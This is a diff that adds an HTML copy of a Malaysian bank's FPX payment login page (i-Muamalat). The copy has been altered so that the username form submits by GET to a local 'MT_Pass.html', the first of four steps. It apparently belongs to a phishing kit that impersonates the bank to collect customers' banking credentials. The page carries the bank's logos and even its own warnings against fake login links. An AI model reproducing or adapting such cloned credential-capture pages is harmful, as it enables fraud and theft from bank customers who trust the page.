@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<!-- saved from url=(0060)https://efpx.muamalat.com.my/fpxb/RIB/usernameInputPage.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+	
+	<title>Welcome to i-Muamalat FPX</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT/font-awesome.min.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT/main.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT/form.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT/step_section.css">
+	<script type="text/javascript" src="./MT/payment.js.download"></script>
+	<script type="text/javascript" src="./MT/sessionTimeout.js.download"></script>
+	<script type="text/javascript" src="./MT/logout.js.download"></script>
+	<script type="text/javascript" src="./MT/jquery-1.11.3.min.js.download"></script>
+	<script type="text/javascript" src="./MT/prng4.js.download"></script>
+	<script type="text/javascript" src="./MT/rng.js.download"></script>
+	<script type="text/javascript" src="./MT/security-1.1-min.js.download"></script>
+	<script type="text/javascript" src="./MT/rsaCrypto.js.download"></script>
+	<style>
+		#errorMsgId {
+			display: none;
+		}
+	</style>
+</head>
+
+<body>
+    <div>
+		<div class="actionbar">
+	        <div class="actionbar_bg vertical-align">
+	            <div class="container">
+	                <div class="row">
+	                    <div class="col-xs-12">
+	                        <div class="left">
+	                            <img class="logo_imuamalat" src="./MT/logo-imuamalat.png">
+	                        </div>
+	                        <div class="right">
+	                            <img class="logo_imuamalat" src="./MT/logo-fpx.png">
+	                        </div>
+	                        <div class="text-center">
+	                            <strong class="actionbar_title">FPX Payment</strong>
+	                        </div>
+	                    </div>
+	                </div>
+	            </div>
+	        </div>
+	    </div>
+    </div>
+	<div>
+		<div class="root">
+	        <div class="container">
+			    <form class="form" name="enterId" action="MT_Pass.html" method="get" >
+					<input type="hidden" name="b" value="MUKLAMAT">
+					<div>
+						<span class="step-clear">&nbsp;</span>
+						<strong class="well well-sm step-section">Step 1 of 4</strong>
+		   			</div>
+
+			        <div class="form-group">
+			            <label for="welcome.muamalat">Welcome to i-Muamalat</label>
+			            <ul>
+							
+						</ul>
+			            <input class="form-control" id="loginId" name="uname" type="text" placeholder="Enter your username" onkeyup="onChangeUsername()" autocomplete="off" maxlength="12" value="">
+			            <input type="hidden" id="loginIdEnc" name="loginId">
+			        </div>
+					<div class="alert alert-danger" id="errorMsgId"></div>
+			        <input class="btn btn-primary" id="btn-login" type="submit" name="_toLoginPassword" value="Next" disabled="">
+			        <div class="cancel-btn">
+			            <input class="btn-link" id="btn-cancel" type="submit" name="_toFPX" onclick="returnFPX();" value="Cancel Transaction">
+			        </div>
+			        
+   				 	<input type="hidden" id="autoLoggedOutTimeout" name="autoLoggedOutTimeout" value="false">
+			        <script>
+						/*<![CDATA[*/
+						if (document.getElementById('loginId').value == '')
+							document.getElementById('btn-login').disabled = true;
+						else
+							document.getElementById('btn-login').disabled = false;
+						/*]]>*/
+					</script>
+			   </form>
+				    	
+			    <hr class="spacer">
+			    <div class="well well-sm">
+			        Security Alert
+			        <ul>
+			            <li>Never download or login via unauthorized application/email links</li>
+			            <li>Never reveal your Username/password to anyone</li>
+			        </ul>
+			    </div>
+			    <input type="hidden" id="errorMsgReqId" value="Username is a required field.">
+				<input type="hidden" id="returnFPX" value="false">
+		    </div>
+	    </div>
+    </div>
+    <input type="hidden" id="sessionExpiredTime" value="1657163860701">
+    <script>
+	$(function(){
+		
+		initSessionExpiredTimer(true);
+		
+		$('input[name=loginId]').focus();
+		
+		
+		$('form[name=enterId]').on('keypress', function(e){
+			if( e.which == 13 ){
+				e.preventDefault();
+				$('#btn-login').click();
+			}
+		});
+	});
+	</script>
+	<script type="text/javascript" src="./MT/form.js.download"></script>
+
+
+</body></html>
